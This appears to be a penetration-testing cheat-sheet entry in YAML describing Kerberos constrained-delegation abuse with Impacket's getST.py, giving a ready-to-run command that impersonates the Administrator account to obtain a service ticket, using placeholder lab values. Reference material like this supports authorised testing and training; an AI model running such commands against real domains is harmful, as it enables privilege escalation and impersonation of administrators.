---
title: |
  Impersonate the Administrator account and request a Service Ticket for a service
description: |
  Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Service: www

  	Host Name: server01.test.local

  	Username: test

  	Password: Welkom01!

  	Impersonated User: Administrator

command: |
  python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/test:Welkom01!
items:
  - Username
  - Password
services:
  - Kerberos
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
  - PrivEsc
  - Persistence
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py
  - http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
---
